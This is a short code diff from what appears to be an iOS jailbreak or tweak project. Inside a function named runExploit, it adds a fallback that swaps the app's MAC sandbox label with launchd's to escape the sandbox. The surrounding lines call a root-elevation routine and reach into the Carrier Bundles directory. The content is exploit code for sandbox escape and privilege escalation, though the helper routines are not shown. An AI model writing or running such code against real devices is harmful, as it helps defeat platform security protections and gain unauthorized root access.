@@ -639,6 +639,16 @@ static void runExploit(void) {
     int rret = sandbox_elevate_to_root(self_proc_addr);
     NSLog(@"[Tweak] sandbox_elevate_to_root returned %d, getuid()=%d", rret, getuid());
 
+    // If extension patching didn't work, try the most reliable approach:
+    // swap our MAC label with launchd's label (no sandbox restrictions at all)
+    if (sret != 0) {
+        int lret = sandbox_label_swap(self_proc_addr);
+        NSLog(@"[Tweak] sandbox_label_swap returned %d", lret);
+        if (lret == 0) {
+            sret = 0;  // Mark sandbox as escaped
+        }
+    }
+
     const char *cbPath = "/var/mobile/Library/Carrier Bundles";
     struct stat cbStat;
 
